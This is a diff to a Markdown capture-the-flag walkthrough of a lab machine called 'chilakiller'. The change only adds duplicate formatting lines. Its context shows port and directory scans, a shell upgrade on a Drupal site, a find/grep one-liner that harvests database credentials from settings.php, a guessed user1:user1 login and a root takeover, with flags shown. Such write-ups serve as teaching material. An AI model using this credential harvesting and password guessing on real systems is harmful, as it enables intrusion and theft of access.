@@ -153,6 +153,7 @@ PORT     STATE SERVICE    VERSION
 2 services unrecognized despite returning data.
 ```
 {: .nolineno}
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -199,6 +200,7 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 [####################] - 7m    102345/102345  253/s   http://10.150.150.182:80/ 
 [####################] - 7m    102345/102345  254/s   http://10.150.150.182/
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now in directory `/restaurante/` I got a drupal site →
@@ -255,12 +257,14 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@chilakiller:/var/www/html/restaurante$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now lets dig deeper into the shell and get come credentials and for that I used this script →
 
 ```bash
 find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
 ```
+{: .nolineno}
 {: .nolineno}
 
 I got this result ⤵️ 
@@ -315,6 +319,7 @@ I got this result ⤵️
 $drupal_hash_salt = 'EWlZLEj4s5rioclU2dTcU-_G1lMvzhVef2wm8NB0Fvk';
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I see a users on home directory →
 
@@ -327,6 +332,7 @@ drwxr-xr-x 23 root  root  4096 Jul 31  2020 ..
 drwxr-x--- 11 user1 user1 4096 Sep 30  2021 user1
 www-data@chilakiller:/home$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now I just hid and tried the user & password as same that is `user1:user1` and I got in ,
@@ -360,6 +366,7 @@ user1@chilakiller:~$ cat FLAG3.txt
 9a8cda5f343e89e68aaec65f1df3c61ae5176a19
 user1@chilakiller:~$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now for root access I searched for `.conf` files and I got these and the credentials for root →
@@ -404,6 +411,7 @@ root@chilakiller:~# cat FLAG2.txt
 ccc61a1d18a937cc3db531a5216a04a805d54762
 root@chilakiller:~#
 ```
+{: .nolineno}
 {: .nolineno}
 
 I am root now !!
